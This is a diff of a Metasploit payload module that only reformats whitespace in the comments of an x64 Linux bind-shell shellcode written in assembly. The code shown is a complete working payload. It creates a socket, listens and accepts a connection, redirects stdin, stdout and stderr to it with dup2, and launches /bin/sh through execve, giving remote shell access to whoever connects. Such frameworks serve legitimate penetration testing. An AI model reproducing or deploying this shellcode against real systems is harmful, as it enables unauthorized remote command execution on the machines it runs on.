@@ -35,21 +35,21 @@ module MetasploitModule
 
       ; Avoiding garbage
       ; These push and pop unset the sign bit in rax used for cdq
-      push 41			  ; syscall 41 - socket
+      push 41       ; syscall 41 - socket
       pop rax
 
       ; Zeroing rdx, search about cdq instruction for understanding
-      cdq			      ; IPPROTO_IP = 0 (int) - rdx
+      cdq           ; IPPROTO_IP = 0 (int) - rdx
 
       push rdx
       pop rsi
-      inc esi			  ; SOCK_STREAM = 1 (int)
+      inc esi       ; SOCK_STREAM = 1 (int)
 
-      push 2			  ; AF_INET = 2 (int)
+      push 2        ; AF_INET = 2 (int)
       pop rdi
 
                     ; syscall 41 (rax) - socket
-      syscall			  ; kernel interruption
+      syscall       ; kernel interruption
 
 
       ; Preparing to listen the incoming connection (passive socket)
@@ -57,12 +57,12 @@ module MetasploitModule
       ; listen(sockfd, int);
 
       ; listen arguments
-      push rdx		  ; put zero into rsi
+      push rdx      ; put zero into rsi
       pop rsi
 
-      xchg eax, edi	; put the file descriptor returned by socket() into rdi
+      xchg eax, edi ; put the file descriptor returned by socket() into rdi
 
-      mov al, 50	  ; syscall 50 - listen
+      mov al, 50    ; syscall 50 - listen
       syscall       ; kernel interruption
 
 
@@ -70,27 +70,27 @@ module MetasploitModule
       ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
       ; accept(sockfd, NULL, NULL)
 
-      ; accept args	; here we need only do nothing, the rdi already contains the sockfd,
+      ; accept args ; here we need only do nothing, the rdi already contains the sockfd,
                     ; likewise rsi and rdx contains 0
 
-      mov al, 43		; syscall 43 - accept
-      syscall			  ; kernel interruption
+      mov al, 43    ; syscall 43 - accept
+      syscall       ; kernel interruption
 
 
       ; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
       ; int dup2(int oldfd, int newfd);
       ; dup2(clientfd, ...)
 
-      push rdi  		; push the sockfd integer to use as the loop counter (rsi)
+      push rdi      ; push the sockfd integer to use as the loop counter (rsi)
       pop rsi
 
-      xchg edi, eax	; put the clientfd returned from accept into rdi
+      xchg edi, eax ; put the clientfd returned from accept into rdi
 
     dup_loop:
-      dec esi	  		; decrement loop counter
+      dec esi       ; decrement loop counter
 
-      mov al, 33		; syscall 33 - dup2
-      syscall		  	; kernel interruption
+      mov al, 33    ; syscall 33 - dup2
+      syscall       ; kernel interruption
 
       jnz dup_loop
 
@@ -102,14 +102,14 @@ module MetasploitModule
       ; execve string argument
                     ; *envp[] rdx is already NULL
                     ; *argv[] rsi is already NULL
-      push rdx			; put NULL terminating string
-      mov rdi, 0x68732f6e69622f2f	; "//bin/sh"
-      push rdi			; push /bin/sh string
-      push rsp			; push the stack pointer
-      pop rdi				; pop it (string address) into rdi
+      push rdx      ; put NULL terminating string
+      mov rdi, 0x68732f6e69622f2f ; "//bin/sh"
+      push rdi      ; push /bin/sh string
+      push rsp      ; push the stack pointer
+      pop rdi       ; pop it (string address) into rdi
 
-      mov al, 59		; execve syscall
-      syscall				; bingo
+      mov al, 59    ; execve syscall
+      syscall       ; bingo
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
   end
